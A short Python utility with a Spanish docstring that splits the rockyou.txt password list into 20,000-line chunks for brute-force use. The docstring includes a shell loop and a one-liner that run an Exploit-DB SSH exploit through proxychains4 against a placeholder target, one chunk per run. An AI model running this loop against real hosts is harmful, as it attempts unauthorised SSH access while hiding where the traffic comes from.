"""
@nuria_imeq
Los ficheros worldlist generalmente son muy tochos.
este programa divide el fichero rockyou en ficheros
de 20000 lineas, lo cual es mas asumible si vas a lanzar
un ataque de fuerza bruta.
Por ejemplo:
   $ python troceafichero.py
   $ cd tmp
   $ for i in `ls -1`;
   do 
      echo proxychains4 python /usr/share/exploitdb/exploits/linux/remote/45233.py
      --port 22 --threads 8 --outputFile exploit_ssh_$i.txt --outputFormat json
	  --userList $i target;
   done

linea completa sin saltos de linea.
for i in `ls -1`;do proxychains4 python /usr/share/exploitdb/exploits/linux/remote/45233.py --port 22 --threads 8 --outputFile exploit_ssh_$i.txt --outputFormat json --userList $i target;done
"""
import fileinput
import os

dir = "tmp"
chunk_size = 20000
fileout = None
try:
	os.mkdir(dir)
except OSError:
	print("Error al crear el directorio, ya existe directorio: %s" % dir)
	exit()
else:
	print("Directorio %s creado con exito" % dir)

filename = "rockyou.txt"
for i, line in enumerate(fileinput.input(filename)):
	if i % chunk_size == 0:
		if fileout: fileout.close()
		fileout = open(dir + "/" + 'salida%d.txt' % (i/chunk_size), 'w')
	fileout.write(line)
fileout.close()
